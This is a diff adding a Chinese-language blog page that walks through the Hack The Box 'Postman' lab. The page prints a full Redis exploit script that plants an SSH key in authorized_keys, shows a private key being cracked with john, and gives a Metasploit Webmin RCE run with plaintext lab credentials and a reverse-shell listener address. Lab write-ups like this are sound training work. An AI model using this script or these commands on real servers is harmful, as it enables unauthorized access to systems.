@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    Postman |
+    
+    yichen&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+<meta name="referrer" content="no-referrer" />
+  <article id="post-pehmm1" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      Postman
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2020/02/27/pehmm1/" class="article-date">
+  <time datetime="2020-02-27T08:53:54.000Z" itemprop="datePublished">2020-02-27</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+                            
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582795803744-b10ecc9d-c7d6-4589-95a2-d0d6a7395f8e.png#align=left&display=inline&height=421&margin=%5Bobject%20Object%5D&name=image.png&originHeight=842&originWidth=1548&size=214891&status=done&style=none&width=774" alt="image.png"></p>
+<p>nmap  扫描一波端口：<br><code>nmap -A -Pn -T4 10.10.10.160</code><br>-Pn    将所有主机视作开启，跳过主机发现的过程<br>-A     OS 识别,版本探测，脚本扫描和 traceroute<br>-T  （0-5）时间优化</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582802742965-ab22a6a1-3d86-430f-97ba-3da9b048aea8.png#align=left&display=inline&height=401&margin=%5Bobject%20Object%5D&name=image.png&originHeight=705&originWidth=904&size=177726&status=done&style=none&width=514" alt="image.png"></p>
+<p>去看一下，80  端口没什么东西， 10000，用 https  访问，有个登录界面，弱口令没得</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582802991547-eb8ac4a8-ea0b-4353-98f3-81f51660d240.png#align=left&display=inline&height=401&margin=%5Bobject%20Object%5D&name=image.png&originHeight=582&originWidth=1044&size=47949&status=done&style=none&width=720" alt="image.png"></p>
+<p>扫描发现 6379  是开着的，（实在是太慢了，我就直接指定去扫了）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582805023860-6bfd6290-bd6b-4ecd-b736-30ee53cf5446.png#align=left&display=inline&height=133&margin=%5Bobject%20Object%5D&name=image.png&originHeight=211&originWidth=637&size=40684&status=done&style=none&width=402" alt="image.png"></p>
+<p>redis  未授权访问</p>
+<p>apt install redis-server  安装  redis  客户端，然后  pip install termcolor  安装需要的库</p>
+<p>使用：<a href="https://github.com/Avinash-acid/Redis-Server-Exploit" target="_blank" rel="noopener">https://github.com/Avinash-acid/Redis-Server-Exploit</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#Author : Avinash Kumar Thapa aka -Acid</span></span><br><span class="line"><span class="comment">#Twitter : https://twitter.com/m_avinash143</span></span><br><span class="line"><span class="comment">#####################################################################################################################################################</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> colored</span><br><span class="line"></span><br><span class="line">script, ip_address, username = argv</span><br><span class="line"></span><br><span class="line">PATH=<span class="string">'/usr/bin/redis-cli'</span></span><br><span class="line">PATH1=<span class="string">'/usr/local/bin/redis-cli'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh_connection</span><span class="params">()</span>:</span></span><br><span class="line">	shell = <span class="string">"ssh -i "</span> + <span class="string">'$HOME/.ssh/id_rsa '</span> + username+<span class="string">"@"</span>+ip_address</span><br><span class="line">	os.system(shell)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(PATH) <span class="keyword">or</span> os.path.isfile(PATH1):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">    	<span class="keyword">print</span> colored(<span class="string">'\t*******************************************************************'</span>, <span class="string">"green"</span>)</span><br><span class="line">    	<span class="keyword">print</span> colored(<span class="string">'\t* [+] [Exploit] Exploiting misconfigured REDIS SERVER*'</span> ,<span class="string">"green"</span>)</span><br><span class="line">    	<span class="keyword">print</span> colored(<span class="string">'\t* [+] AVINASH KUMAR THAPA aka "-Acid"                                '</span>, <span class="string">"green"</span>)</span><br><span class="line">		<span class="keyword">print</span> colored(<span class="string">'\t*******************************************************************'</span>, <span class="string">"green"</span>)</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"\n"</span></span><br><span class="line">		<span class="keyword">print</span> colored(<span class="string">"\t SSH Keys Need to be Generated"</span>, <span class="string">'blue'</span>)</span><br><span class="line">		os.system(<span class="string">'ssh-keygen -t rsa -C \"acid_creative\"'</span>)</span><br><span class="line">		<span class="keyword">print</span> colored(<span class="string">"\t Keys Generated Successfully"</span>, <span class="string">"blue"</span>)</span><br><span class="line">		os.system(<span class="string">"(echo '\r\n\'; cat $HOME/.ssh/id_rsa.pub; echo  \'\r\n\') &gt; $HOME/.ssh/public_key.txt"</span>)</span><br><span class="line">		cmd = <span class="string">"redis-cli -h "</span> + ip_address + <span class="string">' flushall'</span></span><br><span class="line">		cmd1 = <span class="string">"redis-cli -h "</span> + ip_address</span><br><span class="line">		os.system(cmd)</span><br><span class="line">		cmd2 = <span class="string">"cat $HOME/.ssh/public_key.txt | redis-cli -h "</span> +  ip_address + <span class="string">' -x set cracklist'</span></span><br><span class="line">		os.system(cmd2)</span><br><span class="line">		cmd3 = cmd1 + <span class="string">' config set dbfilename "backup.db" '</span></span><br><span class="line">		cmd4 = cmd1 + <span class="string">' config set  dir'</span> + <span class="string">" /usr/lib/"</span>+username+<span class="string">"/.ssh/"</span></span><br><span class="line">		cmd5 = cmd1 + <span class="string">' config set dbfilename "authorized_keys" '</span></span><br><span class="line">		cmd6 = cmd1 + <span class="string">' save'</span></span><br><span class="line">		os.system(cmd3)</span><br><span class="line">		os.system(cmd4)</span><br><span class="line">		os.system(cmd5)</span><br><span class="line">		os.system(cmd6)</span><br><span class="line">		<span class="keyword">print</span> colored(<span class="string">"\tYou'll get shell in sometime..Thanks for your patience"</span>, <span class="string">"green"</span>)</span><br><span class="line">		ssh_connection()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Something went wrong"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">print</span> colored(<span class="string">"\tRedis-cli:::::This utility is not present on your system. You need to install it to proceed further."</span>, <span class="string">"red"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>关于 redis 核心利用点是，<strong>通过没有身份校验的 redis 服务进行登陆</strong>，同时<strong>指定 config dir 和 config dbfilename 的路径与名称</strong>，达到<strong>把本地公钥存储到远程服务器</strong>上，这时候在通过 ssh 进行远程登陆。可以<strong>获得名为 redis 的 shell</strong></p>
+<p><code>python redis.py 10.10.10.160 redis</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582808571536-7594ad74-d490-43fd-9285-a02c952b5b0d.png#align=left&display=inline&height=525&margin=%5Bobject%20Object%5D&name=image.png&originHeight=764&originWidth=771&size=105621&status=done&style=none&width=530" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582808590618-4b9b5faa-6162-4778-86c5-9ff9f3f91128.png#align=left&display=inline&height=348&margin=%5Bobject%20Object%5D&name=image.png&originHeight=493&originWidth=896&size=115416&status=done&style=none&width=633" alt="image.png"></p>
+<p>再  opt  目录下找到 id_rsa.bak</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582860440319-87010c5c-1190-49a1-8533-4372be591ac9.png#align=left&display=inline&height=560&margin=%5Bobject%20Object%5D&name=image.png&originHeight=724&originWidth=653&size=277680&status=done&style=none&width=505" alt="image.png"></p>
+<p>保存出来，用 john  破解一下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582860526552-c0181956-da49-435f-9552-6f529d08ff9b.png#align=left&display=inline&height=226&margin=%5Bobject%20Object%5D&name=image.png&originHeight=354&originWidth=897&size=96045&status=done&style=none&width=572" alt="image.png"></p>
+<p>su Matt  切换一下账户，用破解出来得密码来登录，再 Matt 家目录下有  user.txt</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582860892717-272efab3-aa9e-4dd4-9cc4-54d2b7c4ed08.png#align=left&display=inline&height=114&margin=%5Bobject%20Object%5D&name=image.png&originHeight=127&originWidth=431&size=24417&status=done&style=none&width=388" alt="image.png"></p>
+<p>同时，这个用户名和密码可以登录之前那个 10000  端口的  webmin  可以登录成功<br>可以用  msf  来攻击<br>msfconsole，打开  msf</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582861564220-13f901c6-27b1-4c57-a29c-4fdd747cf668.png#align=left&display=inline&height=358&margin=%5Bobject%20Object%5D&name=image.png&originHeight=716&originWidth=846&size=105867&status=done&style=none&width=423" alt="image.png"></p>
+<p>使用：<br>use exploit/linux/http/webmin_packageup_rce   //选择  payload<br>set rhosts 10.10.10.160     //设置攻击目标<br>set ssl true     //使用  https<br>set username Matt    //  设置  username<br>set password computer2008     //设置  password<br>set lhost 10.10.14.18     //设置反弹  shell  的地址（本机 IP）<br>exploit    //执行攻击</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582862011791-f2e3dd50-894c-4b2e-aaaa-c90b5aab7ea8.png#align=left&display=inline&height=376&margin=%5Bobject%20Object%5D&name=image.png&originHeight=677&originWidth=906&size=128732&status=done&style=none&width=503" alt="image.png"></p>
+<p>在 /root/root.txt  中存在  root  级别的  flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582862045912-634a471b-c4ab-45f0-87f1-9ef1a67a8fdc.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&name=image.png&originHeight=217&originWidth=346&size=15941&status=done&style=none&width=346" alt="image.png"></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2020/02/27/pehmm1/" data-id="ckco53qbf000c8ou92whn944h" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+      <a href="/2020/03/05/kgz3n7/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            Traverxec
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/02/25/erh0l7/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">PWN入门（Advanced ROP）</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+    <div class="vcomments" id="vcomments"></div>
+    
+<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
+
+        <script>
+            new Valine({
+                el: '#vcomments',
+                appId: '',
+                appKey: '',
+                notify: 'false',
+                verify: 'true',
+                avatar: 'mp',
+                pageSize: '10',
+                placeholder: '请输入...'
+            })
+        </script>
+        
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 yichen&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/head.png" alt="yichen&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">主页</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">归档</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener">语雀</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://mp.weixin.qq.com/s/_xKmbanQddRoX2SoAcihWA" target="_blank" rel="noopener">关于</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
